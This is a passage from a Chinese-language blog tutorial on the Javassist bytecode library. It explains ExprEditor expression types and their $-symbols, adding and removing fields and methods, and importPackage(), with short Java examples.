<td>一个 java.lang.Class 对象，表示字段的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行原始字段访问的虚拟方法的名称</td>
</tr>
</tbody></table>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;fieldTest&quot;</span>);</span><br><span class="line">       m.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(FieldAccess fa)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">               <span class="comment">// 如果是写操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isWriter()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println(\&quot;写入的值是：\&quot;+$1);&#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 如果是读操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isReader()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println($_=\&quot;&quot;</span>+fa.getFieldName()+<span class="string">&quot;被读取\&quot;); &#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">       <span class="type">Test</span> <span class="variable">instance</span> <span class="operator">=</span> (Test)cc.toClass().getDeclaredConstructor().newInstance();</span><br><span class="line">       instance.fieldTest();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">       <span class="keyword">private</span> String name;</span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">           System.out.println(a + b);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">           System.out.println(a);</span><br><span class="line">           <span class="keyword">return</span> a*a;</span><br><span class="line">       &#125;</span><br><span class="line">       String <span class="title function_">fieldTest</span><span class="params">()</span>&#123;</span><br><span class="line">           <span class="built_in">this</span>.name = <span class="string">&quot;Ko1sh1&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p>
<h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p>
<p>$ 开头的符号存在部分不同含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code>, <code>$1</code></td>
<td>每一维的大小</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>创建数组的返回值。一个新的数组对象存储在 $_ 中</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>所创建的数组的类型</td>
</tr>
</tbody></table>
<p>比如按下面的方式创建数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[][] s = new String[3][4];</span><br></pre></td></tr></table></figure></div>

<p>那么$1、$2 分别是 3 和 4，$3 不可用。（如果创建的时候省略了最后一维的维度，那么最后一维也不可用）</p>
<h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p>
<p>以$开头的标识符具有特殊含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>instanceof 运算符左侧的值</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的返回值。类型为 boolean</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>instanceof 运算符右侧的值</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 instanceof 运算符右侧的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行 instanceof 表达式的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。如果参数类型和 instanceof 表达式右侧的类型一致，则返回 true。否则返回 false。</td>
</tr>
</tbody></table>
<p>javassist.expr.Cast</p>
<p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>显示类型转换的目标类型</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的结果值。$_ 的类型和被括号括起来的类型相同</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>转换之后的类型，即被括号括起来的类型</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，和 $r 的类型相同</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行类型转换的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。并在类型转换完成后返回它</td>
</tr>
</tbody></table>
<p>javassist.expr.Handler</p>
<p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p>
<p>在源文本中，以$开头的标识符具有意义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$1</code></td>
<td>catch 分支获得的异常对象</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>catch 分支获得的异常对象的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 catch 捕获的异常的类型</td>
</tr>
</tbody></table>
<p>如果一个新的异常分配给 $1，它将作为捕获的异常传递给原始的 catch 子句。</p>
<h2 id="CtField-添加字段"><a href="#CtField-添加字段" class="headerlink" title="CtField 添加字段"></a>CtField 添加字段</h2><p>Javassist 还允许用户创建一个新字段。其中，可以通过 <code>setModifiers</code> 设置修饰类型，addField 的第二个参数表示计算初始值的表达式。这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。如不写第二个参数，则使用默认值。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G6_CtFieldTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">cf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="type">int</span>.class.getName()), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        cf.setModifiers(javassist.Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(cf,<span class="string">&quot;5+5&quot;</span>);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>类变为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G6_CtFieldTest$Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">name</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> G6_CtFieldTest$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的方法也可以简写为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line"><span class="type">CtField</span> <span class="variable">f</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public int z = 0;&quot;</span>, ctClass);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure></div>



<h2 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h2><p>要删除字段或方法，可以使用 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p>
<h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>需要导入的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p>
<p>ClassPool中 调用 importPackage() 可以告诉编译器在解析类名时搜索其他包。 例如，</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">&quot;java.awt&quot;</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">CtField f = CtField.<span class="built_in">make</span>(<span class="string">&quot;public Point p;&quot;</span>, cc);</span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure></div>

<p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 编译器可以将 Point 识别为java.awt.Point。</p>
<p>注意 importPackage() 不会影响 ClassPool 中的 get() 方法。只有编译器才考虑导入包。 get()  的参数必须是完整类名。</p>
]]></content>
  </entry>
</search>
